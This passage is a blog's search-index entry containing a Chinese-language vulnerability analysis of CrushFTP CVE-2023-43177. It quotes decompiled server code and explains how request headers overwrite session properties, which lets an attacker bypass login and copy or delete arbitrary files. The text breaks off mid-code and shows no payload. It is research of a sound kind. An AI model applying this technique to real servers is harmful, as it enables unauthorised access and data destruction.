<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)</title>
      <link href="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/"/>
      <url>/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CrushFTP-Unauthenticated-Remote-Code-Execution"><a href="#CrushFTP-Unauthenticated-Remote-Code-Execution" class="headerlink" title="CrushFTP  Unauthenticated Remote Code Execution"></a>CrushFTP  Unauthenticated Remote Code Execution</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>不像传统套件，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活，在<code>crushftp.server.ServerSessionHTTP</code>可以看到具体的处理过程，代码”依托答辩”，不过漏洞思路值得学习</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211184136935.png" alt="image-20231211184136935"></p><h2 id="前台权限绕过"><a href="#前台权限绕过" class="headerlink" title="前台权限绕过"></a>前台权限绕过</h2><p>简单来说，原理是因为程序实现存在匿名访问机制，并且可以通过header污染当前会话的参数导致产生了一些意外的操作</p><p>在<code>crushftp.server.ServerSessionAJAX#buildPostItem</code>当中，可以看到会解析每一个header，并将解析到的key,val保存到as2Info这个Properties中，同时这里对put的参数没有任何限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">buildPostItem</span><span class="params">(Properties request, <span class="keyword">long</span> http_len_max, Vector headers, String req_id)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties as2Info = <span class="keyword">new</span> Properties();  </span><br><span class="line">        <span class="keyword">boolean</span> write100Continue = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">1</span>;<span class="function">s</span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="params">(x &lt; headers.size()</span>) </span>&#123;</span><br><span class="line">            String data;</span><br><span class="line">            String key = data = headers.elementAt(x).toString();</span><br><span class="line">            String val = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                val = data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim();</span><br><span class="line">                key = data.substring(<span class="number">0</span>, data.indexOf(<span class="string">&quot;:&quot;</span>)).trim().toLowerCase();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;HTTP_SERVER&quot;</span>, <span class="number">3</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            as2Info.put(key, val);  </span><br><span class="line">......省略.....</span><br></pre></td></tr></table></figure><p>我们顺便看看新版本是如何解决这一点的，从<code>processAs2HeaderLine</code>可以看出，允许设置到as2Info当中值受到了限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">processAs2HeaderLine</span><span class="params">(String key, String val, String data, Properties as2Info)</span> </span>&#123;</span><br><span class="line">        as2Info.put(key.trim().toLowerCase(), val.trim());</span><br><span class="line">        <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;message-id:&quot;</span>)) &#123;</span><br><span class="line">            String as2Filename = data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim();</span><br><span class="line">            <span class="keyword">if</span> ((as2Filename = as2Filename.substring(<span class="number">1</span>)).indexOf(<span class="string">&quot;@&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                as2Filename = as2Filename.substring(<span class="number">0</span>, as2Filename.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            as2Filename = Common.replace_str(as2Filename, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            as2Filename = Common.replace_str(as2Filename, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            as2Info.put(<span class="string">&quot;as2Filename&quot;</span>, as2Filename);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;content-type:&quot;</span>)) &#123;</span><br><span class="line">            as2Info.put(<span class="string">&quot;contentType&quot;</span>, data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;disposition-notification-options:&quot;</span>)) &#123;</span><br><span class="line">            as2Info.put(<span class="string">&quot;signMdn&quot;</span>, String.valueOf(data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim().indexOf(<span class="string">&quot;pkcs7-signature&quot;</span>) &gt;= <span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续往下接下来我们可以看到，在光标处没有做任何的限制，直接将as2Info中的每个键值对添加到了当前会话的user_info属性，因此这里存在一个属性覆盖的问题，接下来我们就需要看看覆盖哪些属性可能存在威胁</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210231729940.png" alt="image-20231210231729940"></p><p>关于user_info属性的获取是通过一个封装好的函数来做获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">uiSG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.user_info.containsKey(data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.user_info.getProperty(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在此基础上还有一系列类型转换的封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uiIG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(<span class="keyword">this</span>.uiSG(data));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">uiLG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Long.parseLong(<span class="keyword">this</span>.uiSG(data));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">uiBG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.uiSG(data).toLowerCase().equals(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>接下来就是寻找污染哪些属性可能造成危害，这里漏洞发现者使用了<code>getUserName</code></p><p>其中csrf默认为true，我们需要传入c2f参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">getUserName</span><span class="params">(Properties request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (request.getProperty(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>).equalsIgnoreCase(<span class="string">&quot;getUserName&quot;</span>)) &#123;</span><br><span class="line">        String response = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt; \r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (ServerStatus.BG(<span class="string">&quot;csrf&quot;</span>) &amp;&amp; !request.getProperty(<span class="string">&quot;c2f&quot;</span>, <span class="string">&quot;&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String session_id = <span class="keyword">this</span>.thisSessionHTTP.thisSession.getId();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!request.getProperty(<span class="string">&quot;c2f&quot;</span>, <span class="string">&quot;&quot;</span>).equalsIgnoreCase(session_id.substring(session_id.length() - <span class="number">4</span>))) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiVG(<span class="string">&quot;failed_commands&quot;</span>).addElement(<span class="string">&quot;&quot;</span> + <span class="keyword">new</span> Date().getTime());</span><br><span class="line">                    response = String.valueOf(response) + <span class="string">&quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied. (c2f)&lt;/response&gt;&lt;/commandResult&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;HTTP_SERVER&quot;</span>, <span class="number">2</span>, e);</span><br><span class="line">                <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiVG(<span class="string">&quot;failed_commands&quot;</span>).addElement(<span class="string">&quot;&quot;</span> + <span class="keyword">new</span> Date().getTime());</span><br><span class="line">                response = String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiBG(<span class="string">&quot;user_logged_in&quot;</span>) &amp;&amp; !<span class="keyword">this</span>.thisSessionHTTP.thisSession.uiSG(<span class="string">&quot;user_name&quot;</span>).equals(<span class="string">&quot;&quot;</span>) ? String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;success&lt;/response&gt;&lt;username&gt;&quot;</span> + <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiSG(<span class="string">&quot;user_name&quot;</span>) + <span class="string">&quot;&lt;/username&gt;&lt;/loginResult&gt;&quot;</span> : String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果相等则返回登录成功，同时值得注意的是这里会返回<code>user_name</code>，因此我们可以利用这一点来判断漏洞是否可利用，如果是漏洞版本<code>user_name</code>就可以通过header覆盖，返回也可以是任意可控字符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, <span class="keyword">true</span>, <span class="number">200</span>, <span class="keyword">true</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> json)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, <span class="keyword">true</span>, <span class="number">200</span>, <span class="keyword">true</span>, json, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> log, <span class="keyword">int</span> code, <span class="keyword">boolean</span> convertVars, <span class="keyword">boolean</span> json, <span class="keyword">boolean</span> log_header)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> acceptsGZIP = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> log, <span class="keyword">int</span> code, <span class="keyword">boolean</span> convertVars, <span class="keyword">boolean</span> json, <span class="keyword">boolean</span> acceptsGZIP, <span class="keyword">boolean</span> log_header)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (convertVars) &#123;</span><br><span class="line">        response = ServerStatus.thisObj.change_vars_to_values(response, <span class="keyword">this</span>.thisSessionHTTP.thisSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;HTTP/1.1 &quot;</span> + code + <span class="string">&quot; OK&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Cache-Control: no-store&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Pragma: no-cache&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">if</span> (json) &#123;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Type: application/jsonrequest;charset=utf-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Type: text/&quot;</span> + (response.indexOf(<span class="string">&quot;&lt;?xml&quot;</span>) &gt;= <span class="number">0</span> ? <span class="string">&quot;xml&quot;</span> : <span class="string">&quot;plain&quot;</span>) + <span class="string">&quot;;charset=utf-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (acceptsGZIP) &#123;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Vary: Accept-Encoding&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Content-Encoding: gzip&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Transfer-Encoding: chunked&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Date: &quot;</span> + <span class="keyword">this</span>.thisSessionHTTP.sdf_rfc1123.format(<span class="keyword">new</span> Date()), log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Server: &quot;</span> + ServerStatus.SG(<span class="string">&quot;http_server_header&quot;</span>), log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;P3P: CP=\&quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\&quot;&quot;</span>, log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String origin = <span class="keyword">this</span>.thisSessionHTTP.headerLookup.getProperty(<span class="string">&quot;ORIGIN&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (x &lt; ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>).length) &#123;</span><br><span class="line">                <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (origin.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                    ok = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>)[x].toUpperCase().trim().equalsIgnoreCase(origin.toUpperCase().trim())) &#123;</span><br><span class="line">                    ok = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Origin: &quot;</span> + ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>)[x].trim());</span><br><span class="line">                &#125;</span><br><span class="line">                ++x;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Headers: authorization,content-type&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,PROPFIND,DELETE,MKCOL,MOVE,COPY,HEAD,PROPPATCH,LOCK,UNLOCK,ACL,TR&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;&quot;</span>, log);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = response.getBytes(<span class="string">&quot;UTF8&quot;</span>);</span><br><span class="line">        GZIPOutputStream out = <span class="keyword">new</span> GZIPOutputStream(baos);</span><br><span class="line">        ((OutputStream)out).write(b);</span><br><span class="line">        out.finish();</span><br><span class="line">        <span class="keyword">if</span> (baos.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.original_os.write((String.valueOf(Long.toHexString(baos.size())) + <span class="string">&quot;\r\n&quot;</span>).getBytes());</span><br><span class="line">            baos.writeTo(<span class="keyword">this</span>.thisSessionHTTP.original_os);</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.original_os.write(<span class="string">&quot;\r\n&quot;</span>.getBytes());</span><br><span class="line">            baos.reset();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.original_os.write(<span class="string">&quot;0\r\n\r\n&quot;</span>.getBytes());</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.original_os.flush();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_standard_headers(log);</span><br><span class="line">        <span class="keyword">int</span> len = response.getBytes(<span class="string">&quot;UTF8&quot;</span>).length + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Length: &quot;</span> + len, log_header);</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;&quot;</span>, log);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.write_command_http(response, log, convertVars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.thisSessionHTTP.thisSession.drain_log();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当请求结束，在响应完成之后，在倒数第二行调用了<code>drain_log</code>方法，这个方法也很有意思</p><p>可以看到如果属性当中存在<code>user_log_path_custom</code>，并且不为空，接下来再结合覆盖其他参数</p><ol><li>user_log_path_custom 中的值为new_loc</li><li>user_log_path 中指定的值为old_loc</li><li>旧文件将复制到指定的新位置，并删除旧文件</li></ol><p>现在我们可以做到<code>任意文件复制以及删除</code>，但经过测试我们会发现，如果我们读取一些敏感的配置文件到web路径下，访问后再移动回去会破坏掉文件本身的一些完整性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drain_log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">.....省略.....</span><br><span class="line">    object = <span class="keyword">this</span>.uiVG(<span class="string">&quot;user_log&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path_custom&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String new_loc = <span class="string">&quot;&quot;</span> + <span class="keyword">this</span>.user_info.remove(<span class="string">&quot;user_log_path_custom&quot;</span>);</span><br><span class="line">            String old_loc = <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.uiPUT(<span class="string">&quot;user_log_path&quot;</span>, new_loc);</span><br><span class="line">            <span class="keyword">new</span> File_S(Common.all_but_last(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>))).mkdirs();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).exists() &amp;&amp; !<span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).renameTo(<span class="keyword">new</span> File_S(String.valueOf(new_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)))) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Common.copy(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>), String.valueOf(new_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>), <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    <span class="comment">// empty catch block</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            com.crushftp.client.Common.copyStreams(<span class="keyword">new</span> ByteArrayInputStream(sb.toString().getBytes(<span class="string">&quot;UTF8&quot;</span>)), <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File_S(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)), <span class="keyword">true</span>), <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">new</span> File_S(Common.all_but_last(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>))).mkdirs();</span><br><span class="line">                com.crushftp.client.Common.copyStreams(<span class="keyword">new</span> ByteArrayInputStream(sb.toString().getBytes(<span class="string">&quot;UTF8&quot;</span>)), <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File_S(String.valueOf(<span 